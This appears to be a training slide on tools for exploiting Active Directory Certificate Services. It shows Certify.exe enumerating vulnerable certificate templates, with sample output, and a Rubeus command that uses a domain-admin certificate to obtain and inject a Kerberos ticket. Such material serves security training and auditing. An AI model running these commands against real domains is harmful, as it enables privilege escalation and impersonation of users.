Tools for AD CS Exploitation

Auditing and Leveraging Vulnerable Certificate Services

Certify.exe (GhostPack)

A powerful tool specifically designed to enumerate and identify vulnerable AD CS certificate templates, including those susceptible to ESC1 and ESC8.

Rubeus / Mimikatz

Used to leverage obtained certificates (e.g., PFX files) for Kerberos authentication (kerberos::ptt) to impersonate users and gain TGTs.

Key Takeaway

Specialized tools streamline the process of discovering and exploiting AD CS misconfigurations for privilege escalation.

`Certify.exe` Example

# Using Certify.exe to find vulnerable templates
Certify.exe find /vulnerable

# Example output (simplified)
[*] Found 1 vulnerable template(s):
  Template Name: WebServerAuth
  Vulnerability: ESC1
  Enrollment Agent: True
  Client Authentication: True
  Requester has Enroll permissions.

# Using Rubeus to authenticate with a certificate
Rubeus.exe asktgt /user:DA_Account /certificate:DA_Cert.pfx /password:CertPassword /ptt
This command helps identify templates that can be abused. Once a certificate is obtained, tools like Rubeus can use it for authentication.
